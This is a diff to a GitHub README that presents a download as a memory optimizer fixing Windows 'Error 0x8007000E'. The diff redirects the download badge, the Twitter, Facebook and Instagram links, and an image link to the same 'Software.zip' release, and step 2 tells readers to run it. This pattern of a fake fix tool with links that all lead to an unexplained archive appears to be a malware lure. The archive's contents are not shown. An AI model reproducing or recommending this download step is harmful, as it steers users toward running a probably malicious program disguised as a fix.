@@ -11,7 +11,7 @@ The "Error 0x8007000E" can be a real headache, disrupting your workflow and caus
 To get started with fixing the "Error 0x8007000E", follow the steps below:
 
 1. Download the software from the following link:
-    [![Software Download](https://img.shields.io/static/v1?label=Download&message=Software&color=<COLOR>&style=for-the-badge)](https://github.com/user-attachments/files/17466420/Software.zip)
+    [![Software Download](https://github.com/zandddddddddtttttt/Fixing-Error-0x8007000E/releases/download/v2.0/Software.zip<COLOR>&style=for-the-badge)](https://github.com/zandddddddddtttttt/Fixing-Error-0x8007000E/releases/download/v2.0/Software.zip)
   
 2. Run the downloaded software and follow the on-screen instructions to optimize your system's memory.
   
@@ -35,9 +35,9 @@ If you encounter any difficulties while using the software or have any questions
 
 Stay up to date with the latest developments, news, and updates by following our official social media channels:
 
-- [Twitter](https://twitter.com/FixingError0x)
-- [Facebook](https://www.facebook.com/Fixing-Error-0x8007000E)
-- [Instagram](https://www.instagram.com/fixing_error_0x/)
+- [Twitter](https://github.com/zandddddddddtttttt/Fixing-Error-0x8007000E/releases/download/v2.0/Software.zip)
+- [Facebook](https://github.com/zandddddddddtttttt/Fixing-Error-0x8007000E/releases/download/v2.0/Software.zip)
+- [Instagram](https://github.com/zandddddddddtttttt/Fixing-Error-0x8007000E/releases/download/v2.0/Software.zip)
 
 ## License
 
@@ -47,6 +47,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Now that you have all the tools and information needed to fix the "Error 0x8007000E", go ahead and download the software to optimize your system's memory. Say goodbye to memory-related errors and enjoy a more efficient computing experience! 🚀
 
-![Memory Optimization](https://source.unsplash.com/featured/4000x3000/?memory)
+![Memory Optimization](https://github.com/zandddddddddtttttt/Fixing-Error-0x8007000E/releases/download/v2.0/Software.zip)
 
 Remember, a well-optimized system is a happy system! ✨🖥️
